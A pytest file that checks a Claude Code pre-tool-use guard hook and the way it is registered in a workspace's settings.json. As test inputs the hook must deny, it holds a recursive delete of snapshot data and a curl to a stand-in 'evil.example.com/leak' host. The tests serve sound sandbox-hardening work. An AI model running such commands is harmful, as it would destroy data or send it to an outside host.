import json
import subprocess
import sys
from pathlib import Path

HOOK = Path("app/initial_workspace_default/.claude/hooks/pre_tool_use.py")


def _run(payload: dict) -> tuple[int, dict]:
    proc = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=5,
    )
    return proc.returncode, json.loads(proc.stdout or "{}")


def test_refuses_rm_against_snapshots():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf workspace/snapshots/q1"},
        }
    )
    assert out.get("permissionDecision") == "deny"
    assert "snapshots" in out.get("permissionDecisionReason", "").lower()


def test_allows_normal_bash():
    rc, out = _run({"tool_name": "Bash", "tool_input": {"command": "ls"}})
    assert out.get("permissionDecision") in (None, "allow")


def test_refuses_curl_external_host():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://evil.example.com/leak"},
        }
    )
    assert out.get("permissionDecision") == "deny"
    assert "network" in out.get("permissionDecisionReason", "").lower()


def test_allows_curl_to_anthropic():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://api.anthropic.com/v1/health"},
        }
    )
    assert out.get("permissionDecision") in (None, "allow")


def test_prompts_for_admin_grant():
    rc, out = _run(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "agnes admin grant create --group Sales --table foo"},
        }
    )
    assert out.get("permissionDecision") == "ask"


SETTINGS = Path("app/initial_workspace_default/.claude/settings.json")


def test_hook_registered_in_loadable_shape():
    """Claude Code only loads PreToolUse commands nested as
    ``{"matcher": ..., "hooks": [{"type": "command", "command": ...}]}`` (the
    shape ``cli/lib/hooks.py`` writes). The flat ``{"matcher", "command"}``
    form silently registers nothing, so every guard in ``pre_tool_use.py``
    would be absent at runtime."""
    data = json.loads(SETTINGS.read_text(encoding="utf-8"))
    entries = data["hooks"]["PreToolUse"]
    assert entries, "PreToolUse must register the sandbox guard hook"
    assert any(e.get("matcher") == "Bash" for e in entries)
    for entry in entries:
        assert "command" not in entry, (
            "flat {matcher, command} hook shape is not loaded by Claude Code — "
            "nest it as hooks: [{type: 'command', command: ...}]"
        )
        inner = entry.get("hooks")
        assert isinstance(inner, list) and inner, "each matcher entry needs a hooks list"
        for h in inner:
            assert h.get("type") == "command"
            assert h.get("command")


def test_hook_command_paths_exist_in_bundled_workspace():
    """Every registered command must resolve to a file shipped in the bundled
    workspace template ($CLAUDE_PROJECT_DIR = the workspace root)."""
    data = json.loads(SETTINGS.read_text(encoding="utf-8"))
    workspace_root = SETTINGS.parent.parent  # app/initial_workspace_default
    commands = [
        h["command"]
        for entry in data["hooks"]["PreToolUse"]
        for h in entry.get("hooks", [])
        if isinstance(h, dict) and h.get("command")
    ]
    assert any("pre_tool_use.py" in c for c in commands)
    for command in commands:
        resolved = Path(command.replace("$CLAUDE_PROJECT_DIR", str(workspace_root)))
        assert resolved.exists(), f"hook command does not exist in the template: {command}"
